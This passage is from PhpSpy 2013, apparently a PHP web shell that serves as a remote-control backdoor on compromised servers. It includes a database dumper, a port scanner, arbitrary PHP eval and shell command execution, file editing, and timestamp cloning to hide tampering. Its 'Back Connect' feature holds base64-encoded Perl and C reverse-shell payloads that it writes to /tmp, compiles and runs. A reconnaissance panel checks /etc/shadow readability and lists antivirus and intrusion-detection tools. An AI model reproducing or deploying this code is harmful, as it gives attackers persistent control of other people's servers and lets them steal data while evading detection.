0:\n                                                p('<h2>'.$DB->halt('Error').'</h2>');\n                                                break;\n                                            case 1:\n                                                $result = $DB->query($query);\n                                                $tatol = $DB->num_rows($result);\n                                                p('<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\">');\n                                                p('<tr class=\"head\">');\n                                                $fieldnum = @mysql_num_fields($result);\n                                                for($i=0;$i<$fieldnum;$i++){\n                                                    p('<td nowrap>'.@mysql_field_name($result, $i).'</td>');\n                                                }\n                                                p('</tr>');\n\n                                                if (!$tatol) {\n                                                    p('<tr class=\"alt2\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\'alt2\\';\"><td nowrap colspan=\"'.$fieldnum.'\" class=\"red b\">No records</td></tr>');\n                                                } else {\n                                                    while($mn = $DB->fetch($result)){\n                                                        $thisbg = bg();\n                                                        p('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n                                                        //读取记录用\n                                                        foreach($mn as $key=>$inside){\n                                                            p('<td nowrap>'.(($inside == null) ? '<i>null</i>' : html_clean($inside)).'</td>');\n                                                        }\n                                                        p('</tr>');\n                                                        unset($b1);\n                                                    }\n                                                }\n                                                p('</table>');\n                                                break;\n                                            case 2:\n                                                p('<h2>Affected Rows : '.$DB->affected_rows().'</h2>');\n                                                break;\n                                        }\n                                    }\n                                }\n                            } else {\n                                $query = $DB->query(\"SHOW TABLE STATUS\");\n                                $table_num = $table_rows = $data_size = 0;\n                                $tabledb = array();\n                                while($table = $DB->fetch($query)) {\n                                    $data_size = $data_size + $table['Data_length'];\n                                    $table_rows = $table_rows + $table['Rows'];\n                                    $table_num++;\n                                    $tabledb[] = $table;\n                                }\n                                $data_size = sizecount($data_size);\n                                unset($table);\n                                if (count($tabledb)) {\n                                    if ($highver) {\n                                        $db_engine = $DB->fetch($DB->query(\"SHOW VARIABLES LIKE 'storage_engine';\"));\n                                        $db_collation = $DB->fetch($DB->query(\"SHOW VARIABLES LIKE 'collation_database';\"));\n                                    }\n                                    $sort = array('Name', 1);\n                                    if($order) {\n                                        if(preg_match('!s_([A-z_]+)_(\\d{1})!', $order, $match)) {\n                                            $sort = array($match[1], (int)$match[2]);\n                                        }\n                                    }\n                                    usort($tabledb, 'cmp');\n                                    p('<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" id=\"lists\">');\n                                    p('<tr class=\"head\">');\n                                    p('<td width=\"2%\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"checkall(this.form)\" /></td>');\n                                    p('<td><a href=\"javascript:setsort(\\'s_Name_'.($sort[1]?0:1).'\\');\">Name</a> '.($order == 's_Name_0' ? $dchar : '').($order == 's_Name_1' || !$order ? $uchar : '').'</td>');\n                                    p('<td><a href=\"javascript:setsort(\\'s_Rows_'.($sort[1]?0:1).'\\');\">Rows</a>'.($order == 's_Rows_0' ? $dchar : '').($order == 's_Rows_1' ? $uchar : '').'</td>');\n                                    p('<td><a href=\"javascript:setsort(\\'s_Data_length_'.($sort[1]?0:1).'\\');\">Data_length</a>'.($order == 's_Data_length_0' ? $dchar : '').($order == 's_Data_length_1' ? $uchar : '').'</td>');\n                                    p('<td><a href=\"javascript:setsort(\\'s_Create_time_'.($sort[1]?0:1).'\\');\">Create_time</a>'.($order == 's_Create_time_0' ? $dchar : '').($order == 's_Create_time_1' ? $uchar : '').'</td>');\n                                    p('<td><a href=\"javascript:setsort(\\'s_Update_time_'.($sort[1]?0:1).'\\');\">Update_time</a>'.($order == 's_Update_time_0' ? $dchar : '').($order == 's_Update_time_1' ? $uchar : '').'</td>');\n                                    if ($highver) {\n                                        p('<td>Engine</td>');\n                                        p('<td>Collation</td>');\n                                    }\n                                    p('<td>Other</td>');\n                                    p('</tr>');\n                                    foreach ($tabledb as $key => $table) {\n                                        $thisbg = bg();\n                                        p('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');\n                                        p('<td align=\"center\" width=\"2%\"><input type=\"checkbox\" name=\"bak_table[]\" value=\"'.$table['Name'].'\" /></td>');\n                                        p('<td><a href=\"javascript:settable(\\''.$table['Name'].'\\');\">'.$table['Name'].'</a></td>');\n                                        p('<td>'.$table['Rows'].'&nbsp;</td>');\n                                        p('<td>'.sizecount($table['Data_length']).'</td>');\n                                        p('<td>'.$table['Create_time'].'&nbsp;</td>');\n                                        p('<td>'.$table['Update_time'].'&nbsp;</td>');\n                                        if ($highver) {\n                                            p('<td>'.$table['Engine'].'</td>');\n                                            p('<td>'.$table['Collation'].'</td>');\n                                        }\n                                        p('<td><a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'structure\\');\">Structure</a></td>');\n                                        p('</tr>');\n                                    }\n                                    p('<tr class=\"head\">');\n                                    p('<td width=\"2%\">&nbsp;</td>');\n                                    p('<td>'.$table_num.' table(s)</td>');\n                                    p('<td>'.$table_rows.'</td>');\n                                    p('<td>'.$data_size.'</td>');\n                                    p('<td>&nbsp;</td>');\n                                    p('<td>&nbsp;</td>');\n                                    if ($highver) {\n                                        p('<td>'.$db_engine['Value'].'</td>');\n                                        p('<td>'.$db_collation['Value'].'</td>');\n                                    }\n                                    p('<td>&nbsp;</td>');\n                                    p('</tr>');\n                                    p(\"<tr class=\\\"\".bg().\"\\\"><td colspan=\\\"\".($highver ? 9 : 7).\"\\\"><input name=\\\"saveasfile\\\" value=\\\"1\\\" type=\\\"checkbox\\\" /> Save as file <input class=\\\"input\\\" name=\\\"bak_path\\\" value=\\\"\".SA_ROOT.$dbname.\".sql\\\" type=\\\"text\\\" size=\\\"60\\\" /> <input class=\\\"bt\\\" type=\\\"button\\\" value=\\\"Export selection table\\\" onclick=\\\"$('doing').value='dump';$('dbform').submit();\\\" /></td></tr>\");\n                                    p(\"</table>\");\n                                } else {\n                                    p('<p class=\"red b\">No tables</p>');\n                                }\n                                $DB->free_result($query);\n                            }\n                        }\n                        $DB->close();\n                    }\n                    formfoot();\n                }//end mysql\n\n                elseif ($act == 'backconnect') {\n\n                    !$p2 && $p2 = $_SERVER['REMOTE_ADDR'];\n                    !$p3 && $p3 = '12345';\n                    $usedb = array('perl'=>'perl','c'=>'c');\n\n                    $back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\".\n                        \"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\".\n                        \"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\".\n                        \"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\".\n                        \"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\".\n                        \"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\".\n                        \"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";\n                    $back_connect_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\".\n                        \"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\".\n                        \"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\".\n                        \"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\".\n                        \"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\".\n                        \"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\".\n                        \"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\".\n                        \"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\";\n\n                    if ($p1 == 'start' && $p2 && $p3 && $p4){\n                        if ($p4 == 'perl') {\n                            cf('/tmp/angel_bc',$back_connect);\n                            $res = execute(which('perl').\" /tmp/angel_bc \".$p2.\" \".$p3.\" &\");\n                        } else {\n                            cf('/tmp/angel_bc.c',$back_connect_c);\n                            $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');\n                            @unlink('/tmp/angel_bc.c');\n                            $res = execute(\"/tmp/angel_bc \".$p2.\" \".$p3.\" &\");\n                        }\n                        m('Now script try connect to '.$p2.':'.$p3.' ...');\n                    }\n\n                    formhead(array('title'=>'Back Connect', 'onsubmit'=>'g(\\'backconnect\\',null,\\'start\\',this.p2.value,this.p3.value,this.p4.value);return false;'));\n                    p('<p>');\n                    p('Your IP:');\n                    makeinput(array('name'=>'p2','size'=>20,'value'=>$p2));\n                    p('Your Port:');\n                    makeinput(array('name'=>'p3','size'=>15,'value'=>$p3));\n                    p('Use:');\n                    makeselect(array('name'=>'p4','option'=>$usedb,'selected'=>$p4));\n                    makeinput(array('value'=>'Start','type'=>'submit','class'=>'bt'));\n                    p('</p>');\n                    formfoot();\n                }//end\n\n                elseif ($act == 'portscan') {\n                    !$p2 && $p2 = '127.0.0.1';\n                    !$p3 && $p3 = '21,80,135,139,445,1433,3306,3389,5631,43958';\n                    formhead(array('title'=>'Port Scan', 'onsubmit'=>'g(\\'portscan\\',null,\\'start\\',this.p2.value,this.p3.value);return false;'));\n                    p('<p>');\n                    p('IP:');\n                    makeinput(array('name'=>'p2','size'=>20,'value'=>$p2));\n                    p('Port:');\n                    makeinput(array('name'=>'p3','size'=>80,'value'=>$p3));\n                    makeinput(array('value'=>'Scan','type'=>'submit','class'=>'bt'));\n                    p('</p>');\n                    formfoot();\n\n                    if ($p1 == 'start') {\n                        p('<h2>Result &raquo;</h2>');\n                        p('<ul class=\"info\">');\n                        foreach(explode(',', $p3) as $port) {\n                            $fp = @fsockopen($p2, $port, $errno, $errstr, 1);\n                            if (!$fp) {\n                                p('<li>'.$p2.':'.$port.' ------------------------ <span class=\"b\">Close</span></li>');\n                            } else {\n                                p('<li>'.$p2.':'.$port.' ------------------------ <span class=\"red b\">Open</span></li>');\n                                @fclose($fp);\n                            }\n                        }\n                        p('</ul>');\n                    }\n                }\n\n                elseif ($act == 'eval') {\n                    $phpcode = trim($p1);\n                    if($phpcode){\n                        if (!preg_match('#<\\?#si', $phpcode)) {\n                            $phpcode = \"<?php\\n\\n{$phpcode}\\n\\n?>\";\n                        }\n                        eval(\"?\".\">$phpcode<?\");\n                    }\n                    formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\\'eval\\',null,this.p1.value);return false;'));\n                    maketext(array('title'=>'PHP Code','name'=>'p1', 'value'=>$phpcode));\n                    p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');\n                    formfooter();\n                }//end eval\n\n                elseif ($act == 'editfile') {\n\n                    // 编辑文件\n                    if ($p1 == 'edit' && $p2 && $p3) {\n                        $fp = @fopen($p2,'w');\n                        m('Save file '.(@fwrite($fp,$p3) ? 'success' : 'failed'));\n                        @fclose($fp);\n                    }\n                    $contents = '';\n                    if(file_exists($p2)) {\n                        $fp=@fopen($p2,'r');\n                        $contents=@fread($fp, filesize($p2));\n                        @fclose($fp);\n                        $contents=htmlspecialchars($contents);\n                    }\n                    formhead(array('title'=>'Create / Edit File', 'onsubmit'=>'g(\\'editfile\\',null,\\'edit\\',this.p2.value,this.p3.value);return false;'));\n                    makeinput(array('title'=>'Filename','name'=>'p2','value'=>$p2,'newline'=>1));\n                    maketext(array('title'=>'File Content','name'=>'p3','value'=>$contents));\n                    formfooter();\n                    goback();\n\n                }//end editfile\n\n                elseif ($act == 'newtime') {\n                    $filemtime = @filemtime($p1);\n\n                    formhead(array('title'=>'Clone folder/file was last modified time', 'onsubmit'=>'g(\\'file\\',null,\\'clonetime\\',this.p2.value,this.p3.value);return false;'));\n                    makeinput(array('title'=>'Alter folder/file','name'=>'p2','value'=>$p1,'size'=>120,'newline'=>1));\n                    makeinput(array('title'=>'Reference folder/file','name'=>'p3','value'=>$cwd,'size'=>120,'newline'=>1));\n                    formfooter();\n\n                    formhead(array('title'=>'Set last modified', 'onsubmit'=>'g(\\'file\\',null,\\'settime\\',this.p2.value,this.p3.value);return false;'));\n                    makeinput(array('title'=>'Current folder/file','name'=>'p2','value'=>$p1,'size'=>120,'newline'=>1));\n                    makeinput(array('title'=>'Modify time','name'=>'p3','value'=>date(\"Y-m-d H:i:s\", $filemtime),'size'=>120,'newline'=>1));\n                    formfooter();\n\n                    goback();\n                }//end newtime\n\n                elseif ($act == 'shell') {\n                    formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this.p1.value);return false;'));\n                    p('<p>');\n                    makeinput(array('name'=>'p1','value'=>htmlspecialchars($p1)));\n                    makeinput(array('class'=>'bt','type'=>'submit','value'=>'Execute'));\n                    p('</p>');\n                    formfoot();\n\n                    if ($p1) {\n                        p('<pre>'.execute($p1).'</pre>');\n                    }\n                }//end shell\n\n                elseif ($act == 'phpenv') {\n                    $d=array();\n                    if(function_exists('mysql_get_client_info'))\n                        $d[] = \"MySql (\".mysql_get_client_info().\")\";\n                    if(function_exists('mssql_connect'))\n                        $d[] = \"MSSQL\";\n                    if(function_exists('pg_connect'))\n                        $d[] = \"PostgreSQL\";\n                    if(function_exists('oci_connect'))\n                        $d[] = \"Oracle\";\n                    $info = array(\n                        1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),\n                        2 => array('Server Domain',$_SERVER['SERVER_NAME']),\n                        3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),\n                        4 => array('Server OS',PHP_OS),\n                        5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),\n                        6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),\n                        7 => array('Server Web Port',$_SERVER['SERVER_PORT']),\n                        8 => array('PHP run mode',strtoupper(php_sapi_name())),\n                        9 => array('The file path',__FILE__),\n\n                        10 => array('PHP Version',PHP_VERSION),\n                        11 => array('PHPINFO',(IS_PHPINFO ? '<a href=\"javascript:g(\\'phpinfo\\');\">Yes</a>' : 'No')),\n                        12 => array('Safe Mode',getcfg('safe_mode')),\n                        13 => array('Administrator',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from'))),\n                        14 => array('allow_url_fopen',getcfg('allow_url_fopen')),\n                        15 => array('enable_dl',getcfg('enable_dl')),\n                        16 => array('display_errors',getcfg('display_errors')),\n                        17 => array('register_globals',getcfg('register_globals')),\n                        18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),\n                        19 => array('memory_limit',getcfg('memory_limit')),\n                        20 => array('post_max_size',getcfg('post_max_size')),\n                        21 => array('upload_max_filesize',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed')),\n                        22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),\n                        23 => array('disable_functions',($dis_func ? $dis_func : 'No')),\n                        24 => array('Supported databases',implode(', ', $d)),\n                        25 => array('cURL support',function_exists('curl_version') ? 'Yes' : 'No'),\n                        26 => array('Open base dir',getcfg('open_basedir')),\n                        27 => array('Safe mode exec dir',getcfg('safe_mode_exec_dir')),\n                        28 => array('Safe mode include dir',getcfg('safe_mode_include_dir')),\n                    );\n\n                    $hp = array(0=> 'Server', 1=> 'PHP');\n                    for($a=0;$a<2;$a++) {\n                        p('<h2>'.$hp[$a].' &raquo;</h2>');\n                        p('<ul class=\"info\">');\n                        if ($a==0) {\n                            for($i=1;$i<=9;$i++) {\n                                p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');\n                            }\n                        } elseif ($a == 1) {\n                            for($i=10;$i<=25;$i++) {\n                                p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');\n                            }\n                        }\n                        p('</ul>');\n                    }\n                }//end phpenv\n\n                elseif ($act == 'secinfo') {\n\n                    if( !IS_WIN ) {\n                        $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');\n                        $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');\n                        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');\n                        secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? \"yes\" : 'no');\n                        secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? \"yes\" : 'no');\n                        secparam('OS version', @file_get_contents('/proc/version'));\n                        secparam('Distr name', @file_get_contents('/etc/issue.net'));\n                        $safe_mode = @ini_get('safe_mode');\n                        if(!$GLOBALS['safe_mode']) {\n                            $temp=array();\n                            foreach ($userful as $item)\n                                if(which($item)){$temp[]=$item;}\n                            secparam('Userful', implode(', ',$temp));\n                            $temp=array();\n                            foreach ($danger as $item)\n                                if(which($item)){$temp[]=$item;}\n                            secparam('Danger', implode(', ',$temp));\n                            $temp=array();\n                            foreach ($downloaders as $item)\n                                if(which($item)){$temp[]=$item;}\n                            secparam('Downloaders', implode(', ',$temp));\n                            secparam('Hosts', @file_get_contents('/etc/hosts'));\n                            secparam('HDD space', execute('df -h'));\n                            secparam('Mount options', @file_get_contents('/etc/fstab'));\n                        }\n                    } else {\n                        secparam('OS Version',execute('ver'));\n                        secparam('Account Settings',execute('net accounts'));\n                        secparam('User Accounts',execute('net user'));\n                        secparam('IP Configurate',execute('ipconfig -all'));\n                    }\n                }//end\n\n                else {\n                    m('Undefined Action');\n                }\n\n                ?>\n            </td></tr></table>\n    <div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">\n\t<span style=\"float:right;\">\n\t<?php\n    debuginfo();\n    ob_end_flush();\n    if (isset($DB)) {\n        echo '. '.$DB->querycount.' queries';\n    }\n    ?>\n\t</span>\n        Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2013 final</a>. Copyright (C) 2004-2013 <a href=\"http://www.4ngel.net\" target=\"_blank\">[S4T]</a> All Rights Reserved.\n    </div>\n    </body>\n    </html>\n\n<?php\n\n/*======================================================\n函数库\n======================================================*/\n\nfunction secparam($n, $v) {\n    $v = trim($v);\n    if($v) {\n        p('<h2>'.$n.' &raquo;</h2>');\n        p('<div class=\"infolist\">');\n        if(strpos($v, \"\\n\") === false)\n            p($v.'<br />');\n        else\n            p('<pre>'.$v.'</pre>');\n        p('</div>');\n    }\n}\nfunction m($msg) {\n    echo '<div style=\"margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;\">';\n    echo $msg;\n    echo '</div>';\n}\nfunction s_array($array) {\n    return is_array($array) ? array_map('s_array', $array) : stripslashes($array);\n}\nfunction scookie($key, $value, $life = 0, $prefix = 1) {\n    global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;\n    $key = ($prefix ? $cookiepre : '').$key;\n    $life = $life ? $life : $cookielife;\n    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;\n    setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);\n}\nfunction loginpage() {\n    formhead();\n    makehide('act','login');\n    makeinput(array('name'=>'password','type'=>'password','size'=>'20'));\n    makeinput(array('type'=>'submit','value'=>'Login'));\n    formfoot();\n    exit;\n}\nfunction execute($cfe) {\n    $res = '';\n    if ($cfe) {\n        if(function_exists('system')) {\n            @ob_start();\n            @system($cfe);\n            $res = @ob_get_contents();\n            @ob_end_clean();\n        } elseif(function_exists('passthru')) {\n            @ob_start();\n            @passthru($cfe);\n            $res = @ob_get_contents();\n            @ob_end_clean();\n        } elseif(function_exists('shell_exec')) {\n            $res = @shell_exec($cfe);\n        } elseif(function_exists('exec')) {\n            @exec($cfe,$res);\n            $res = join(\"\\n\",$res);\n        } elseif(@is_resource($f = @popen($cfe,\"r\"))) {\n            $res = '';\n            while(!@feof($f)) {\n                $res .= @fread($f,1024);\n            }\n            @pclose($f);\n        }\n    }\n    return $res;\n}\nfunction which($pr) {\n    $path = execute(\"which $pr\");\n    return ($path ? $path : $pr);\n}\nfunction cf($fname,$text){\n    if($fp=@fopen($fname,'w')) {\n        @fputs($fp,@base64_decode($text));\n        @fclose($fp);\n    }\n}\nfunction dirsize($cwd) {\n    $dh = @opendir($cwd);\n    $size = 0;\n    while($file = @readdir($dh)) {\n        if ($file != '.' && $file != '..') {\n            $path = $cwd.'/'.$file;\n            $size += @is_dir($path) ? dirsize($path) : sprintf(\"%u\", @filesize($path));\n        }\n    }\n    @closedir($dh);\n    return $size;\n}\n// 页面调试信息\nfunction debuginfo() {\n    global $starttime;\n    $mtime = explode(' ', microtime());\n    $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);\n    echo 'Processed in '.$totaltime.' second(s)';\n}\n\n// 清除HTML代码\nfunction html_clean($content) {\n    $content = htmlspecialchars($content);\n    $content = str_replace(\"\\n\", \"<br />\", $content);\n    $content = str_replace(\"  \", \"&nbsp;&nbsp;\", $content);\n    $content = str_replace(\"\\t\", \"&nbsp;&nbsp;&nbsp;&nbsp;\", $content);\n    return $content;\n}\n\n// 获取权限\nfunction getChmod($file){\n    return substr(base_convert(@fileperms($file),10,8),-4);\n}\n\nfunction PermsColor($f) {\n    if (!is_readable($f)) {\n        return '<span class=\"red\">'.getPerms($f).'</span>';\n    } elseif (!is_writable($f)) {\n        return '<span class=\"black\">'.getPerms($f).'</span>';\n    } else {\n        return '<span class=\"green\">'.getPerms($f).'</span>';\n    }\n}\nfunction getPerms($file) {\n    $mode = @fileperms($file);\n    if (($mode & 0xC000) === 0xC000) {$type = 's';}\n    elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}\n    elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}\n    elseif (($mode & 0x8000) === 0x8000) {$type = '-';}\n    elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}\n    elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}\n    elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}\n    else {$type = '?';}\n\n    $owner['read'] = ($mode & 00400) ? 'r' : '-';\n    $owner['write'] = ($mode & 00200) ? 'w' : '-';\n    $owner['execute'] = ($mode & 00100) ? 'x' : '-';\n    $group['read'] = ($mode & 00040) ? 'r' : '-';\n    $group['write'] = ($mode & 00020) ? 'w' : '-';\n    $group['execute'] = ($mode & 00010) ? 'x' : '-';\n    $world['read'] = ($mode & 00004) ? 'r' : '-';\n    $world['write'] = ($mode & 00002) ? 'w' : '-';\n    $world['execute'] = ($mode & 00001) ? 'x' : '-';\n\n    if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}\n    if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}\n    if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}\n\n    return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];\n}\n\nfunction getUser($file)\t{\n    if (function_exists('posix_getpwuid')) {\n        $array = @posix_getpwuid(@fileowner($file));\n        if ($array && is_array($array)) {\n            return ' / <a href=\"#\" title=\"User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'\">'.$array['name'].'</a>';\n        }\n    }\n    return '';\n}\n\nfunction copy_paste($c,$f,$d){\n    if(is_dir($c.$f)){\n        mkdir($d.$f);\n        $dirs = scandir($c.$f);\n        if ($dirs) {\n            $dirs = array_diff($dirs, array('..', '.'));\n            foreach ($dirs as $file) {\n                copy_paste($c.$f.'/',$file, $d.$f.'/');\n            }\n        }\n    } elseif(is_file($c.$f)) {\n        copy($c.$f, $d.$f);\n    }\n}\n// 删除目录\nfunction deltree($deldir) {\n    $dirs = @scandir($deldir);\n    if ($dirs) {\n        $dirs = array_diff($dirs, array('..', '.'));\n        foreach ($dirs as $file) {\n            if((is_dir($deldir.'/'.$file))) {\n                @chmod($deldir.'/'.$file,0777);\n                deltree($deldir.'/'.$file);\n            } else {\n                @chmod($deldir.'/'.$file,0777);\n                @unlink($deldir.'/'.$file);\n            }\n        }\n        @chmod($deldir,0777);\n        return @rmdir($deldir) ? 1 : 0;\n    } else {\n        return 0;\n    }\n}\n\n// 表格行间的背景色替换\nfunction bg() {\n    global $bgc;\n    return ($bgc++%2==0) ? 'alt1' : 'alt2';\n}\n\nfunction cmp($a, $b) {\n    global $sort;\n    if(is_numeric($a[$sort[0]])) {\n        return (($a[$sort[0]] < $b[$sort[0]]) ? -1 : 1)*($sort[1]?1:-1);\n    } else {\n        return strcmp($a[$sort[0]], $b[$sort[0]])*($sort[1]?1:-1);\n    }\n}\n\n// 获取当前目录的上级目录\nfunction getUpPath($cwd) {\n    $pathdb = explode('/', $cwd);\n    $num = count($pathdb);\n    if ($num > 2) {\n        unset($pathdb[$num-1],$pathdb[$num-2]);\n    }\n    $uppath = implode('/', $pathdb).'/';\n    $uppath = str_replace('//', '/', $uppath);\n    return $uppath;\n}\n\n// 检查PHP配置参数\nfunction getcfg($varname) {\n    $result = get_cfg_var($varname);\n    if ($result == 0) {\n        return 'No';\n    } elseif ($result == 1) {\n        return 'Yes';\n    } else {\n        return $result;\n    }\n}\n\n// 获得文件扩展名\nfunction getext($file) {\n    $info = pathinfo($file);\n    return $info['extension'];\n}\nfunction GetWDirList($path){\n    global $dirdata,$j,$web_cwd;\n    !$j && $j=1;\n    $dirs = @scandir($path);\n    if ($dirs) {\n        $dirs = array_diff($dirs, array('..','.'));\n        foreach ($dirs as $file) {\n            $f=str_replace('//','/',$path.'/'.$file);\n            if(is_dir($f)){\n                if (is_writable($f)) {\n                    $dirdata[$j]['filename']='/'.str_replace($web_cwd,'',$f);\n                    $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));\n                    $dirdata[$j]['chmod']=getChmod($f);\n                    $dirdata[$j]['perm']=PermsColor($f);\n                    $dirdata[$j]['owner']=getUser($f);\n                    $dirdata[$j]['link']=$f;\n                    $j++;\n                }\n                GetWDirList($f);\n            }\n        }\n        return $dirdata;\n    } else {\n        return array();\n    }\n}\nfunction sizecount($size) {\n    $unit = array('Bytes', 'KB', 'MB', 'GB', 'TB','PB');\n    for ($i = 0; $size >= 1024 && $i < 5; $i++) {\n        $size /= 1024;\n    }\n    return round($size, 2).' '.$unit[$i];\n}\nfunction p($str){\n    echo $str.\"\\n\";\n}\n\nfunction makehide($name,$value=''){\n    p(\"<input id=\\\"$name\\\" type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\" />\");\n}\n\nfunction makeinput($arg = array()){\n    $arg['size'] = isset($arg['size']) && $arg['size'] > 0 ? \"size=\\\"$arg[size]\\\"\" : \"size=\\\"100\\\"\";\n    $arg['type'] = isset($arg['type']) ? $arg['type'] : 'text';\n    $arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';\n    $arg['class'] = isset($arg['class']) ? $arg['class'] : 'input';\n    $arg['name'] = isset($arg['name']) ? $arg['name'] : '';\n    $arg['value'] = isset($arg['value']) ? $arg['value'] : '';\n    if (isset($arg['newline'])) p('<p>');\n    p(\"$arg[title]<input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] />\");\n    if (isset($arg['newline'])) p('</p>');\n}\n\nfunction makeselect($arg = array()){\n    $onchange = isset($arg['onchange']) ? 'onchange=\"'.$arg['onchange'].'\"' : '';\n    $arg['title'] = isset($arg['title']) ? 